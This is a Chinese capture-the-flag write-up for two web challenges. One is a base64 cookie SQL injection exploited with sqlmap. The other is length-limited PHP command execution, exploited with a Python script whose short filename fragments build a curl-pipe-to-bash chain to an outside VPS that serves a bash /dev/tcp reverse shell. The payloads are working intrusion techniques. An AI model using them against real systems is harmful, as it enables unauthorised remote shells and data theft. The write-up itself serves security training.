你能爆破吗

打开链接显示如下

随便输入111进行测试发现页面回显了一串sql查询语句

结合题目提到的cookie注入，这里就再抓包看看

结果发现cookie是base64编码的。通过测试发现此处是存在SQL注入的，于是将请求包保存为txt文本文件，把level设置为3进行注入探测

sqlmap -r test.txt --tamper base64encode.py --level 3

从结果来看存在注入，接着探测数据库

sqlmap -r test.txt --tamper base64encode.py --level 3 --dbs

探测security表

sqlmap -r test.txt --tamper base64encode.py --level 3 --tables -D security

探测flag字段

sqlmap -r test.txt --tamper base64encode.py --level 3 --columns -T flag -D security

得到flag

sqlmap -r test.txt --tamper base64encode.py --level 3 --dump -C flag -T flag -D security

<?php
highlight_file(__FILE__);if(strlen($_GET[1]<7)){    echo strlen($_GET[1]);    echo '<hr/>';    echo shell_exec($_GET[1]);}

这道题其实很有意思，是考察的限定字符长度下的命令执行。详情参考(https://blog.csdn.net/nzjdsds/article/details/102873187)

这里我们是通过Curl个人vps服务器来做的，服务器上index文件内容为bash -i >& /dev/tcp/39.106.168.127/7777 0>&1，然后监听本地7777端口。等待靶场访问该文件即可反弹shell。

使用脚本如下：

import requestsfrom time import sleepfrom urllib.parse import quote
payload = [    '>ls\\',     'ls>_',     '>\ \\',     '>-t\\',     '>\>g',     'ls>>_',     '>sh',     '>ba\\',     '>\|\\',    '>7\\',    '>12\\', '>8.\\',     '>16\\',    '>6.\\',     '>10\\',     '>9.\\',     '>3\\',     '>\ \\',     '>rl\\',     '>cu\\',     # exec    'sh _',     'sh g', ]
for i in payload:    assert len(i) <= 5     r = requests.get('http://f0345211.yunyansec.com/?1=' + quote(i) )    print(i)sleep(0.2)

在vps上获取shell之后直接cat ../key即可得到flag
